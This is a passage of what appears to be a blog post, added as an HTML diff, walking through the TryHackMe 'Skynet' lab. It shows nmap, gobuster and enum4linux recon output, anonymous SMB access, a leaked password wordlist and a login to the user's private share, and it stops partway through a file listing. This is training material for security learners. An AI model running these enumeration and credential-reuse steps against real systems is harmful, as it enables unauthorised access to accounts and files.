@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html class="dark" lang=" en"><head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TryHackMe - Skynet | Akymos.io</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="TryHackMe - Skynet" />
+<meta name="author" content="Akymos" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="A vulnerable Terminator themed Linux machine." />
+<meta property="og:description" content="A vulnerable Terminator themed Linux machine." />
+<link rel="canonical" href="https://akymos.io/ctf/2023/05/06/skynet.html" />
+<meta property="og:url" content="https://akymos.io/ctf/2023/05/06/skynet.html" />
+<meta property="og:site_name" content="Akymos.io" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-05-06T13:20:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TryHackMe - Skynet" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Akymos"},"dateModified":"2023-05-06T13:20:00+00:00","datePublished":"2023-05-06T13:20:00+00:00","description":"A vulnerable Terminator themed Linux machine.","headline":"TryHackMe - Skynet","mainEntityOfPage":{"@type":"WebPage","@id":"https://akymos.io/ctf/2023/05/06/skynet.html"},"url":"https://akymos.io/ctf/2023/05/06/skynet.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/main.css"><link type="application/atom+xml" rel="alternate" href="https://akymos.io/feed.xml" title="Akymos.io" /><!-- Magnific Popup core CSS file -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js" integrity="sha512-jGR1T3dQerLCSm/IGEGbndPwzszJBlKQ5Br9vuB0Pw2iyxOy+7AK+lJcCC8eaXyz/9du+bkCy4HXxByhxkHf+w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js" integrity="sha512-IsNh5E3eYy3tr/JiX2Yx4vsCujtkhwl7SLqgnwLNgf04Hrt9BT9SXlLlZlWx+OK4ndzAoALhsMNcCmkggjZB1w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/flowbite/1.6.5/flowbite.min.js" integrity="sha512-CUU7D5YgLISaFU6CpCXmXG6dZDD7RoYBocHwukyd7SYkFy0p7gP3zXGSLOtJ1bELJnK6aYBg4t7hnl0d8Dk2YA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+</head><body class="flex flex-col min-h-screen"><header>
+    <nav>
+        <div class="max-w-screen-xl flex flex-wrap items-center justify-between mx-auto p-4">
+            <div>
+                <h1 class="font-bold leading-tight mt-3 text-3xl text-slate-100 lg:mb-6 lg:text-3xl">
+                    <a href="/index.html">Akymos.io</a>
+                </h1>
+            </div>  
+            <button data-collapse-toggle="navbar-default" type="button" class="inline-flex items-center p-2 ml-3 text-sm rounded-lg md:hidden focus:outline-none" aria-controls="navbar-default" aria-expanded="false">
+                <span class="sr-only">Open menu</span>
+                <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
+            </button>
+            <div class="hidden w-full md:block md:w-auto" id="navbar-default">
+                <ul class="font-medium flex flex-col p-4 md:p-0 mt-4 border rounded-lg  md:flex-row md:space-x-8 md:mt-0 md:border-0">
+                    <li>
+                        <a href="/ctf/index.html" class="block font-bold md:mt-3 lg:mb-6 lg:text-3xl">CTF</a>
+                    </li>
+                    <li>
+                        <a href="/project/index.html" class="block font-bold md:mt-3 lg:mb-6 lg:text-3xl">PROJECTS</a>
+                    </li>
+                    <li>
+                        <a href="/about.html" class="block font-bold md:mt-3 lg:mb-6 lg:text-3xl">ABOUT</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+</header><main class="pb-4">
+        <div class="flex justify-between px-4 mx-auto max-w-screen-xl ">
+            <article class="mx-auto w-full format format-sm sm:format-base lg:format-lg format-invert prose prose-invert lg:prose-xl">
+                <header class="mb-4 lg:mb-6 not-format">
+    <address class="flex items-center mb-6 not-italic">
+        <div class="inline-flex items-center mr-3 text-sm text-white">
+            <a href="/about.html">
+                <img class="mr-4 w-16 h-16 rounded-full" src="https://github.com/akymos.png" alt="Akymos">
+            </a>
+            <div>
+                <p class="text-base font-light text-gray-400">
+                    <time pubdate="2023-05-06 13:20:00 +0000" datetime="2023-05-06 13:20:00 +0000" title="06 May 2023">Published on today</time> by <a href="/about.html" class="text-base font-light text-gray-400">Akymos</a>
+                </p>
+                <p class="text-base font-light text-gray-400">
+                    2 min read
+                </p>
+                <p class="text-base font-light text-gray-400">
+                    
+                    <a class="tag ctf" href="/tag/ctf/index.html">ctf</a>
+                    
+                    <a class="tag tryhackme" href="/tag/tryhackme/index.html">tryhackme</a>
+                    
+                </p>
+            </div>
+        </div>
+    </address>
+    <h1>TryHackMe - Skynet</h1>
+</header>
+
+<hr />
+<h2>
+  
+  
+    Table of Contents
+  
+  
+</h2>
+    
+<nav class="toc">
+<ul id="markdown-toc">
+  <li><a href="#room-info" id="markdown-toc-room-info">Room info</a>    <ul>
+      <li><a href="#questions" id="markdown-toc-questions">Questions</a></li>
+    </ul>
+  </li>
+  <li><a href="#step-0---recon" id="markdown-toc-step-0---recon">Step 0 - Recon</a>    <ul>
+      <li><a href="#nmap" id="markdown-toc-nmap">Nmap</a></li>
+      <li><a href="#gobuster" id="markdown-toc-gobuster">Gobuster</a></li>
+      <li><a href="#enum4linux" id="markdown-toc-enum4linux">enum4linux</a></li>
+    </ul>
+  </li>
+  <li><a href="#question-1---what-is-miles-password-for-his-emails" id="markdown-toc-question-1---what-is-miles-password-for-his-emails">Question 1 - What is Miles password for his emails?</a></li>
+  <li><a href="#question-2---what-is-the-hidden-directory" id="markdown-toc-question-2---what-is-the-hidden-directory">Question 2 - What is the hidden directory?</a></li>
+  <li><a href="#question-3---what-is-the-vulnerability-called-when-you-can-include-a-remote-file-for-malicious-purposes" id="markdown-toc-question-3---what-is-the-vulnerability-called-when-you-can-include-a-remote-file-for-malicious-purposes">Question 3 - What is the vulnerability called when you can include a remote file for malicious purposes?</a></li>
+  <li><a href="#question-4---what-is-the-user-flag" id="markdown-toc-question-4---what-is-the-user-flag">Question 4 - What is the user flag?</a></li>
+  <li><a href="#question-5---what-is-the-root-flag" id="markdown-toc-question-5---what-is-the-root-flag">Question 5 - What is the root flag?</a></li>
+</ul>
+
+</nav><hr />
+
+<div class="pb-1"></div>
+<h2 id="room-info">
+  
+  
+    <a href="#room-info">#</a> Room info
+  
+  
+</h2>
+    
+<ul>
+  <li><strong>Name</strong>: Skynet</li>
+  <li><strong>Link</strong>: <a href="https://tryhackme.com/room/skynet" target="_blank">https://tryhackme.com/room/skynet</a></li>
+  <li><strong>Subscription</strong>: Subscription</li>
+  <li><strong>Difficulty</strong>: Easy</li>
+  <li><strong>Description</strong>: A vulnerable Terminator themed Linux machine.</li>
+</ul>
+<h3 id="questions">
+  
+  
+    <a href="#questions">#</a> Questions
+  
+  
+</h3>
+    
+<ol>
+  <li>What is Miles password for his emails?</li>
+  <li>What is the hidden directory?</li>
+  <li>What is the vulnerability called when you can include a remote file for malicious purposes?</li>
+  <li>What is the user flag?</li>
+  <li>What is the root flag?</li>
+</ol>
+<h2 id="step-0---recon">
+  
+  
+    <a href="#step-0---recon">#</a> Step 0 - Recon
+  
+  
+</h2>
+    
+<h3 id="nmap">
+  
+  
+    <a href="#nmap">#</a> Nmap
+  
+  
+</h3>
+    
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.91.54   
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-05-06 13:27 CEST
+Nmap scan report <span class="k">for </span>10.10.91.54 <span class="o">(</span>10.10.91.54<span class="o">)</span>
+Host is up <span class="o">(</span>0.047s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 994 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 992331bbb1e943b756944cb9e82146c5 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 57c07502712d193183dbe4fe679668cf <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 46fa4efc10a54f5757d06d54f6c34dfe <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http        Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Skynet
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: RESP-CODES TOP PIPELINING AUTH-RESP-CODE UIDL SASL CAPA
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: ENABLE IMAP4rev1 more LITERAL+ have LOGIN-REFERRALS LOGINDISABLEDA0001 capabilities post-login ID Pre-login IDLE listed OK SASL-IR
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+Service Info: Host: SKYNET<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
+| smb2-time: 
+|   <span class="nb">date</span>: 2023-05-06T11:27:15
+|_  start_date: N/A
+|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 <span class="o">(</span>Xerox<span class="o">)</span>
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 6.1 <span class="o">(</span>Samba 4.3.11-Ubuntu<span class="o">)</span>
+|   Computer name: skynet
+|   NetBIOS computer name: SKYNET<span class="se">\x</span>00
+|   Domain name: <span class="se">\x</span>00
+|   FQDN: skynet
+|_  System <span class="nb">time</span>: 2023-05-06T06:27:15-05:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>15.63 seconds
+</code></pre></div></div>
+<h3 id="gobuster">
+  
+  
+    <a href="#gobuster">#</a> Gobuster
+  
+  
+</h3>
+    
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-u</span> 10.10.91.54 <span class="nt">-q</span>  
+/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 276]
+/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 276]
+/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 276]
+/admin                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 310] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.91.54/admin/]
+/config               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.91.54/config/]
+/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 308] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.91.54/css/]
+/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 523]
+/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 307] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.91.54/js/]
+/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 276]
+/squirrelmail         <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.91.54/squirrelmail/]
+</code></pre></div></div>
+<h3 id="enum4linux">
+  
+  
+    <a href="#enum4linux">#</a> enum4linux
+  
+  
+</h3>
+    
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>enum4linux <span class="nt">-a</span> 10.10.91.54  
+Starting enum4linux v0.9.1 <span class="o">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="o">)</span> on Sat May  6 13:39:33 2023
+
+ <span class="o">=========================================(</span> Target Information <span class="o">)=========================================</span>
+                                                                                                                                                                                
+Target ........... 10.10.91.54                                                                                                                                                  
+RID Range ........ 500-550,1000-1050
+Username ......... <span class="s1">''</span>
+Password ......... <span class="s1">''</span>
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ <span class="o">============================(</span> Enumerating Workgroup/Domain on 10.10.91.54 <span class="o">)============================</span>
+                                                                                                                                                                                
+                                                                                                                                                                                
+<span class="o">[</span>+] Got domain/workgroup name: WORKGROUP                                                                                                                                        
+                                                                                                                                                                                
+                                                                                                                                                                                
+ <span class="o">================================(</span> Nbtstat Information <span class="k">for </span>10.10.91.54 <span class="o">)================================</span>
+                                                                                                                                                                                
+Looking up status of 10.10.91.54                                                                                                                                                
+        SKYNET          &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
+        SKYNET          &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service
+        SKYNET          &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
+        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser
+        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
+        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser
+        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections
+
+        MAC Address <span class="o">=</span> 00-00-00-00-00-00
+
+ <span class="o">====================================(</span> Session Check on 10.10.91.54 <span class="o">)====================================</span>
+                                                                                                                                                                                
+                                                                                                                                                                                
+<span class="o">[</span>+] Server 10.10.91.54 allows sessions using username <span class="s1">''</span>, password <span class="s1">''</span>                                                                                                           
+                                                                                                                                                                                
+                                                                                                                                                                                
+ <span class="o">=================================(</span> Getting domain SID <span class="k">for </span>10.10.91.54 <span class="o">)=================================</span>
+                                                                                                                                                                                
+Domain Name: WORKGROUP                                                                                                                                                          
+Domain Sid: <span class="o">(</span>NULL SID<span class="o">)</span>
+
+<span class="o">[</span>+] Can<span class="s1">'t determine if host is part of domain or part of a workgroup                                                                                                            
+                                                                                                                                                                                
+                                                                                                                                                                                
+ ===================================( OS information on 10.10.91.54 )===================================
+                                                                                                                                                                                
+                                                                                                                                                                                
+[E] Can'</span>t get OS info with smbclient                                                                                                                                            
+                                                                                                                                                                                
+                                                                                                                                                                                
+<span class="o">[</span>+] Got OS info <span class="k">for </span>10.10.91.54 from srvinfo:                                                                                                                                   
+        SKYNET         Wk Sv PrQ Unx NT SNT skynet server <span class="o">(</span>Samba, Ubuntu<span class="o">)</span>                                                                                                       
+        platform_id     :       500
+        os version      :       6.1
+        server <span class="nb">type</span>     :       0x809a03
+
+
+ <span class="o">========================================(</span> Users on 10.10.91.54 <span class="o">)========================================</span>
+                                                                                                                                                                                
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson       Name:   Desc:                                                                                                   
+
+user:[milesdyson] rid:[0x3e8]
+
+ <span class="o">==================================(</span> Share Enumeration on 10.10.91.54 <span class="o">)==================================</span>
+                                                                                                                                                                                
+                                                                                                                                                                                
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+        print<span class="nv">$ </span>         Disk      Printer Drivers
+        anonymous       Disk      Skynet Anonymous Share
+        milesdyson      Disk      Miles Dyson Personal Share
+        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>skynet server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
+Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
+
+        Server               Comment
+        <span class="nt">---------</span>            <span class="nt">-------</span>
+
+        Workgroup            Master
+        <span class="nt">---------</span>            <span class="nt">-------</span>
+        WORKGROUP            SKYNET
+
+<span class="o">[</span>+] Attempting to map shares on 10.10.91.54                                                                                                                                     
+                                                                                                                                                                                
+//10.10.91.54/print<span class="nv">$ </span>   Mapping: DENIED Listing: N/A Writing: N/A                                                                                                               
+//10.10.91.54/anonymous Mapping: OK Listing: OK Writing: N/A
+//10.10.91.54/milesdyson        Mapping: DENIED Listing: N/A Writing: N/A
+
+<span class="o">[</span>E] Can<span class="s1">'t understand response:                                                                                                                                                  
+                                                                                                                                                                                
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                                      
+//10.10.91.54/IPC$      Mapping: N/A Listing: N/A Writing: N/A
+
+ ============================( Password Policy Information for 10.10.91.54 )============================
+                                                                                                                                                                                
+                                                                                                                                                                                
+
+[+] Attaching to 10.10.91.54 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+[+] Found domain(s):
+
+        [+] SKYNET
+        [+] Builtin
+
+[+] Password Info for Domain: SKYNET
+
+        [+] Minimum password length: 5
+        [+] Password history length: None
+        [+] Maximum password age: 37 days 6 hours 21 minutes 
+        [+] Password Complexity Flags: 000000
+
+                [+] Domain Refuse Password Change: 0
+                [+] Domain Password Store Cleartext: 0
+                [+] Domain Password Lockout Admins: 0
+                [+] Domain Password No Clear Change: 0
+                [+] Domain Password No Anon Change: 0
+                [+] Domain Password Complex: 0
+
+        [+] Minimum password age: None
+        [+] Reset Account Lockout Counter: 30 minutes 
+        [+] Locked Account Duration: 30 minutes 
+        [+] Account Lockout Threshold: None
+        [+] Forced Log off Time: 37 days 6 hours 21 minutes 
+
+
+
+[+] Retieved partial password policy with rpcclient:                                                                                                                            
+                                                                                                                                                                                
+                                                                                                                                                                                
+Password Complexity: Disabled                                                                                                                                                   
+Minimum Password Length: 5
+
+
+ =======================================( Groups on 10.10.91.54 )=======================================
+                                                                                                                                                                                
+                                                                                                                                                                                
+[+] Getting builtin groups:                                                                                                                                                     
+                                                                                                                                                                                
+                                                                                                                                                                                
+[+]  Getting builtin group memberships:                                                                                                                                         
+                                                                                                                                                                                
+                                                                                                                                                                                
+[+]  Getting local groups:                                                                                                                                                      
+                                                                                                                                                                                
+                                                                                                                                                                                
+[+]  Getting local group memberships:                                                                                                                                           
+                                                                                                                                                                                
+                                                                                                                                                                                
+[+]  Getting domain groups:                                                                                                                                                     
+                                                                                                                                                                                
+                                                                                                                                                                                
+[+]  Getting domain group memberships:                                                                                                                                          
+                                                                                                                                                                                
+                                                                                                                                                                                
+ ===================( Users on 10.10.91.54 via RID cycling (RIDS: 500-550,1000-1050) )===================
+                                                                                                                                                                                
+                                                                                                                                                                                
+[I] Found new SID:                                                                                                                                                              
+S-1-22-1                                                                                                                                                                        
+
+[I] Found new SID:                                                                                                                                                              
+S-1-5-32                                                                                                                                                                        
+
+[I] Found new SID:                                                                                                                                                              
+S-1-5-32                                                                                                                                                                        
+
+[I] Found new SID:                                                                                                                                                              
+S-1-5-32                                                                                                                                                                        
+
+[I] Found new SID:                                                                                                                                                              
+S-1-5-32                                                                                                                                                                        
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                     
+                                                                                                                                                                                
+S-1-22-1-1001 Unix User\milesdyson (Local User)                                                                                                                                 
+
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                                     
+                                                                                                                                                                                
+S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                                               
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+
+[+] Enumerating users using SID S-1-5-21-2393614426-3774336851-1116533619 and logon username '', password ''                                                                    
+                                                                                                                                                                                
+S-1-5-21-2393614426-3774336851-1116533619-501 SKYNET\nobody (Local User)                                                                                                        
+S-1-5-21-2393614426-3774336851-1116533619-513 SKYNET\None (Domain Group)
+S-1-5-21-2393614426-3774336851-1116533619-1000 SKYNET\milesdyson (Local User)
+
+ ================================( Getting printer info for 10.10.91.54 )================================
+                                                                                                                                                                                
+No printers returned.                                                                                                                                                           
+</span></code></pre></div></div>
+<h2 id="question-1---what-is-miles-password-for-his-emails">
+  
+  
+    <a href="#question-1---what-is-miles-password-for-his-emails">#</a> Question 1 - What is Miles password for his emails?
+  
+  
+</h2>
+    
+<p>We have anonymous access on smb, so we can take a look at the share.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="se">\\\\</span>10.10.91.54<span class="se">\\</span>anonymous
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\a</span>kymos]:
+
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> 
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Thu Nov 26 17:04:00 2020
+  ..                                  D        0  Tue Sep 17 09:20:17 2019
+  attention.txt                       N      163  Wed Sep 18 05:04:59 2019
+  logs                                D        0  Wed Sep 18 06:42:16 2019
+
+                9204224 blocks of size 1024. 5830316 blocks available
+smb: <span class="se">\&gt;</span> get attention.txt 
+getting file <span class="se">\a</span>ttention.txt of size 163 as attention.txt <span class="o">(</span>0.9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.9 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span> <span class="nb">cd </span>logs<span class="se">\</span>
+smb: <span class="se">\l</span>ogs<span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Wed Sep 18 06:42:16 2019
+  ..                                  D        0  Thu Nov 26 17:04:00 2020
+  log2.txt                            N        0  Wed Sep 18 06:42:13 2019
+  log1.txt                            N      471  Wed Sep 18 06:41:59 2019
+  log3.txt                            N        0  Wed Sep 18 06:42:16 2019
+
+                9204224 blocks of size 1024. 5830316 blocks available
+smb: <span class="se">\l</span>ogs<span class="se">\&gt;</span> get log1.txt 
+getting file <span class="se">\l</span>ogs<span class="se">\l</span>og1.txt of size 471 as log1.txt <span class="o">(</span>2.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.8 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\l</span>ogs<span class="se">\&gt;</span> get log2.txt 
+getting file <span class="se">\l</span>ogs<span class="se">\l</span>og2.txt of size 0 as log2.txt <span class="o">(</span>0.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.3 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\l</span>ogs<span class="se">\&gt;</span> get log3.txt 
+getting file <span class="se">\l</span>ogs<span class="se">\l</span>og3.txt of size 0 as log3.txt <span class="o">(</span>0.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.0 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\l</span>ogs<span class="se">\&gt;</span> <span class="nb">exit</span>
+</code></pre></div></div>
+<p>Let’s take a look at the logs.
+<code class="language-plaintext highlighter-rouge">attention.txt</code>:</p>
+<pre><code class="language-txt">A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
+-Miles Dyson
+</code></pre>
+<p><code class="language-plaintext highlighter-rouge">log1.txt</code>:</p>
+<pre><code class="language-txt">cyborg007haloterminator
+terminator22596
+terminator219
+terminator20
+terminator1989
+terminator1988
+terminator168
+terminator16
+terminator143
+terminator13
+terminator123!@#
+terminator1056
+terminator101
+terminator10
+terminator02
+terminator00
+roboterminator
+pongterminator
+manasturcaluterminator
+exterminator95
+exterminator200
+dterminator
+djxterminator
+dexterminator
+determinator
+cyborg007haloterminator
+avsterminator
+alonsoterminator
+Walterminator
+79terminator6
+1996terminator
+</code></pre>
+<p>Using one of the passwords from the log, we can login to the email server.
+<img src="/assets/images/ctf-skynet/01.png" alt="Skynet - Email" class="post-image" /></p>
+<h2 id="question-2---what-is-the-hidden-directory">
+  
+  
+    <a href="#question-2---what-is-the-hidden-directory">#</a> Question 2 - What is the hidden directory?
+  
+  
+</h2>
+    
+<p>Looking through the emails, we can find the smb password.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="se">\\\\</span>10.10.91.54<span class="se">\\</span>milesdyson<span class="se">\\</span> <span class="nt">-U</span> milesdyson
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\m</span>ilesdyson]:
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Tue Sep 17 11:05:47 2019
+  ..                                  D        0  Wed Sep 18 05:51:03 2019
+  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 11:05:14 2019
+  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 11:05:14 2019
+  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 11:05:14 2019
+  notes                               D        0  Tue Sep 17 11:18:40 2019
+  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 11:05:14 2019
+  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 11:05:14 2019
+
+                9204224 blocks of size 1024. 5829328 blocks available
+smb: <span class="se">\&gt;</span> <span class="nb">cd </span>notes<span class="se">\</span>
+smb: <span class="se">\n</span>otes<span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Tue Sep 17 11:18:40 2019
+  ..                                  D        0  Tue Sep 17 11:05:47 2019
+  3.01 Search.md                      N    65601  Tue Sep 17 11:01:29 2019
+  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 11:01:29 2019
+  2.08 In Practice.md                 N     7949  Tue Sep 17 11:01:29 2019
+  0.00 Cover.md                       N     3114  Tue Sep 17 11:01:29 2019
+  1.02 Linear Algebra.md              N    70314  Tue Sep 17 11:01:29 2019
+  important.txt                       N      117  Tue Sep 17 11:18:39 2019
+  6.01 pandas.md                      N     9221  Tue Sep 17 11:01:29 2019
+  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 11:01:29 2019
+  2.01 Overview.md                    N     1165  Tue Sep 17 11:01:29 2019
+  3.02 Planning.md                    N    71657  Tue Sep 17 11:01:29 2019
+  1.04 Probability.md                 N    62712  Tue Sep 17 11:01:29 2019
+  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 11:01:29 2019
+  2.00 Machine Learning.md            N       26  Tue Sep 17 11:01:29 2019
+  1.03 Calculus.md                    N    40779  Tue Sep 17 11:01:29 2019
+  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 11:01:29 2019
+  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 11:01:29 2019
+  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 11:01:29 2019
+  6.00 Appendices.md                  N       20  Tue Sep 17 11:01:29 2019
+  1.01 Functions.md                   N     7627  Tue Sep 17 11:01:29 2019
+  2.03 Neural Nets.md                 N   144726  Tue Sep 17 11:01:29 2019
+  2.04 Model Selection.md             N    33383  Tue Sep 17 11:01:29 2019
+  2.02 Supervised Learning.md         N    94287  Tue Sep 17 11:01:29 2019
+  4.00 Simulation.md                  N       20  Tue Sep 17 11:01:29 2019
+  3.05 In Practice.md                 N     1123  Tue Sep 17 11:01:29 2019
+  1.07 Graphs.md                      N     5110  Tue Sep 17 11:01:29 2019
+  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 11:01:29 2019
+  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 11:01:29 2019
+  5.03 Anonymization.md               N     2516  Tue Sep 17 11:01:29 2019
+  5.01 Process.md                     N     5788  Tue Sep 17 11:01:29 2019
+  1.09 Optimization.md                N    25823  Tue Sep 17 11:01:29 2019
